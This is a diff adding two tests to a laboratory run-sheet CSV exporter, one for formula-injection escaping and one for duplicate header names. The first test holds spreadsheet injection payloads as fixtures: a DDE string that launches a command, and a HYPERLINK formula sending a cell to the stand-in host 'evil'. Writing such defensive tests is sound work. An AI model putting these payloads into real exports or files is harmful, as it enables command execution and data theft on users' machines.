@@ -176,3 +176,70 @@ def test_a_saved_sheet_names_the_revision_it_is_of() -> None:
     """A sheet is printed and carried to a bench, where the design has already moved on."""
     assert run_sheet_filename("design-abc", 3) == "design-abc-r3-run-sheet.csv"
     assert run_sheet_filename("design-abc", 4) != run_sheet_filename("design-abc", 3)
+
+
+def test_a_free_text_cell_cannot_reach_a_spreadsheet_as_a_formula() -> None:
+    """The hazard neither this file nor `run_sheet_csv` enumerated, and the one that executes.
+
+    Excel, LibreOffice and Google Sheets evaluate a cell opening with `=`, `+`, `-`, `@`, a tab or
+    a CR, and `QUOTE_MINIMAL` does not stop it — quoting is stripped at import and the text is then
+    parsed. `solvent` and `note` are free text on a design drafted from tool results and edited over
+    `POST /protocols/{id}/revisions`.
+
+    Both arms matter. A prefixed formula is inert; an unprefixed number is what makes the mitigation
+    usable, because `-40` is a temperature and prefixing it would corrupt the LIMS import this
+    export feeds.
+    """
+    design = ExperimentDesign(
+        request=_request(),
+        arms=[
+            ProtocolArm(
+                arm_id="A1",
+                setpoints=Setpoints(solvent="@SUM(1+9)*cmd|'/C calc'!A0", temperature_c=-40.0),
+                note='=HYPERLINK("http://evil/?"&A1,"x")',
+            )
+        ],
+    )
+
+    rows = _parsed(run_sheet_csv(design))
+    header, arm = rows[0], rows[1]
+    cell = dict(zip(header, arm, strict=True))
+
+    assert cell["solvent"].startswith("'"), "a formula-triggering solvent reached the sheet live"
+    assert cell["note"].startswith("'"), "a formula-triggering note reached the sheet live"
+    assert cell["temperature_c"] == "-40", (
+        "a negative number was prefixed, which corrupts the numeric column this export exists for"
+    )
+
+
+def test_a_factor_named_like_a_fixed_column_does_not_produce_two_columns_of_that_name() -> None:
+    """A solvent screen is the canonical design here, and `solvent` is also a fixed column.
+
+    Shipped, the header carried `solvent` twice: the fixed one (empty, because the value varies)
+    and the factor. Readers disagree about which is real — `header.index` and `pandas.read_csv`
+    take the first, `dict(zip(...))` takes the last — so a LIMS import keyed by name got blanks for
+    the factor that is the point of the plate.
+
+    Asserted as header uniqueness rather than as the suffix's spelling, because the property is
+    that a reader cannot be ambiguous, not what the disambiguation looks like.
+    """
+    factors = [
+        Factor(
+            name="solvent",
+            kind="categorical",
+            levels=[FactorLevel(label="THF"), FactorLevel(label="DMF")],
+        )
+    ]
+    arms = [
+        ProtocolArm(arm_id="A1", levels={"solvent": "THF"}),
+        ProtocolArm(arm_id="A2", levels={"solvent": "DMF"}),
+    ]
+    design = ExperimentDesign(request=_request(), factors=factors, arms=arms)
+
+    header = _parsed(run_sheet_csv(design))[0]
+
+    assert len(header) == len(set(header)), f"the run sheet header repeats a column: {header}"
+    assert "solvent" in header, "the fixed column keeps its name"
+    assert any(name != "solvent" and "solvent" in name for name in header), (
+        "the factor column must still be findable by a reader looking for the factor"
+    )
